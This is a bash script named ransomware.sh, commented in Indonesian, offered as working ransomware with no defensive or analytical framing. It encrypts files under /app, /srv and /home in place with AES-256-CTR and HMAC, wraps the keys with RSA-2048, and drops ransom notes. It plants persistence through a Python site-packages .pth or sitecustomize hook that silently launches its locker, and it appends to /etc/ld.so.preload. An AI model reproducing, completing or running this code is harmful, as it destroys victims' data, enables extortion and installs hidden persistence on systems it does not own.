#!/bin/bash
# ransomware.sh — payload enkripsi + injector persistence global. root.
# pakai: run | inject | lock | dry
set -u

H=${HXN_DIR:-/usr/lib/.hxn}
APP=${HXN_APP:-$(pwd)}
JOBS=${JOBS:-8}
WORK=$H                                     # FIX 1
MODE=${1:-run}                              # FIX 2
ROOTS=${HXN_ROOTS:-/app:/srv:/home}
EXT=" txt log conf ini yml yaml json xml csv sql db pdf doc docx jpg png zip tar gz bak php py js key pem html htm pyc "
HDR=HXN1
umask 077

[ "$(id -u)" = 0 ] || echo "[!] Bukan root, sebagian file gagal."
mkdir -p "$H" || exit 1
cd "$H" || exit 1

for r in ${ROOTS//:/ }; do
  case "$WORK" in "$r"/*) echo "[!] WORK ($WORK) di dalam ROOTS ($r) — kunci ikut terenkripsi";; esac
done

if [ ! -f ransom_priv.pem ]; then
  openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out ransom_priv.pem 2>/dev/null || exit 1
  openssl pkey -in ransom_priv.pem -pubout -out pub.pem 2>/dev/null || exit 1
  chmod 600 ransom_priv.pem
fi

hx(){ od -An -v -tx1 "$1" | tr -d ' \n'; }

enc_one(){
  local f=${1:-}
  local W=${WORK:-$H} M=${HDR:-HXN1} t ek ct l     # FIX 1b: resolve lokal
  [ -n "$f" ] || return 0
  [ -f "$f" ] && [ ! -L "$f" ] && [ -s "$f" ] || return 0
  [ "$(head -c4 -- "$f" 2>/dev/null)" = "$M" ] && return 0
  [ -w "$f" ] || return 0
  [ "${HXN_DRYRUN:-0}" = 1 ] && { echo "  $f"; echo x >> "$W/.count"; return 0; }
  t=$(mktemp -d "$W/.t.XXXXXX") || return 0

  openssl rand 32 > "$t/k"; openssl rand 32 > "$t/m"; openssl rand 16 > "$t/iv"
  cat "$t/k" "$t/m" > "$t/blob"
  openssl pkeyutl -encrypt -pubin -inkey "$W/pub.pem" \
    -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256 \
    -in "$t/blob" -out "$t/ek" 2>/dev/null || { rm -rf "$t"; return 0; }
  openssl enc -aes-256-ctr -K "$(hx "$t/k")" -iv "$(hx "$t/iv")" \
    -in "$f" -out "$t/ct" 2>/dev/null || { rm -rf "$t"; return 0; }
  cat "$t/iv" "$t/ct" | openssl dgst -sha256 -mac HMAC \
    -macopt "hexkey:$(hx "$t/m")" -binary > "$t/mac" || { rm -rf "$t"; return 0; }   # FIX 3

  l=$(stat -c%s "$t/ek")
  { printf '%s' "$M"
    printf '%b' "$(printf '\\x%02x\\x%02x' $((l>>8)) $((l&255)))"
    cat "$t/ek" "$t/mac" "$t/iv" "$t/ct"; } > "$f.hxn" && mv -f "$f.hxn" "$f"
  echo x >> "$W/.count"
  rm -rf "$t"
}

run_lock(){
  : > .count
  for r in ${ROOTS//:/ }; do
    [ -d "$r" ] || continue
    while IFS= read -r -d '' f; do
      e=${f##*.}; e=${e,,}
      case "$EXT" in *" $e "*) ;; *) continue ;; esac
      if (( BASH_VERSINFO[0]>4 || (BASH_VERSINFO[0]==4 && BASH_VERSINFO[1]>=3) )); then
        enc_one "$f" &
        while [ "$(jobs -rp | wc -l)" -ge "$JOBS" ]; do wait -n; done
      else
        enc_one "$f"
      fi
    done < <(find "$r" -type d -name '.*' -prune -o -type f -print0 2>/dev/null)
  done
  wait
  enc=$(wc -l < .count 2>/dev/null); enc=${enc:-0}; rm -f .count
  msg="=== HXN ===
$enc file terenkripsi AES-256-CTR + HMAC-SHA256, kunci dibungkus RSA-2048-OAEP.
Kunci: $WORK/ransom_priv.pem
ID: $(openssl rand -hex 8)"
  for r in ${ROOTS//:/ }; do [ -d "$r" ] && printf '%s\n' "$msg" > "$r/README_HXN.txt" 2>/dev/null; done
  echo "[lock] $enc file terenkripsi"
}

write_arm(){                                # FIX 4: launcher berisi
  cp "$0" "$H/ransomware.sh" 2>/dev/null || echo "[!] tidak bisa salin diri, set HXN_SRC"
  chmod 700 "$H/ransomware.sh" 2>/dev/null
  cat > arm.sh <<A
#!/bin/bash
set -u
H=$H
L=\$H/.arm.lock
mkdir "\$L" 2>/dev/null || exit 0
trap 'rmdir "\$L" 2>/dev/null' EXIT
sleep "\${HXN_DELAY:-2}"
exec /bin/bash "\$H/ransomware.sh" lock
A
  chmod 700 arm.sh
}

install_hook(){
  SP=$(python3 -c 'import site;print(site.getsitepackages()[0])' 2>/dev/null)
  if [ -n "${SP:-}" ] && [ -d "$SP" ] && [ -w "$SP" ]; then
    printf '%s\n' "import os,subprocess as s;p='$H';os.path.exists(p+'/.armed') or not os.path.exists(p+'/arm.sh') or (os.close(os.open(p+'/.armed',os.O_CREAT|os.O_WRONLY,0o600)), s.Popen(['/bin/sh',p+'/arm.sh'],stdout=-3,stderr=-3,start_new_session=True))" > "$SP/zz-hxn.pth"
    echo "[+] hook: $SP/zz-hxn.pth"
  else
    printf 'import os,subprocess as s;p="%s";os.path.exists(p+"/.armed") or (os.close(os.open(p+"/.armed",os.O_CREAT|os.O_WRONLY,0o600)), s.Popen(["/bin/sh",p+"/arm.sh"],stdout=-3,stderr=-3,start_new_session=True))\n' "$H" > "$H/zzhxn.py"
    [ -n "${SP:-}" ] && [ -d "$SP" ] && printf 'import sys;sys.path.insert(0,"%s");import zzhxn\n' "$H" > "$SP/sitecustomize.py" && echo "[+] hook: sitecustomize"
  fi
  if [ -f "$H/libhxn.so" ]; then
    grep -qxF "$H/libhxn.so" /etc/ld.so.preload 2>/dev/null || echo "$H/libhxn.so" >> /etc/ld.so.preload
  fi
}

case "$MODE" in
  run)    install_hook; write_arm; run_lock ;;
  inject) install_hook; write_arm; rm -f "$H/.armed"; echo "[*] terpasang, arm menunggu python" ;;
  lock)   run_lock ;;
  dry)    export HXN_DRYRUN=1; run_lock ;;
  *) echo "pakai: $0 {run|inject|lock|dry}"; exit 1 ;;
esac
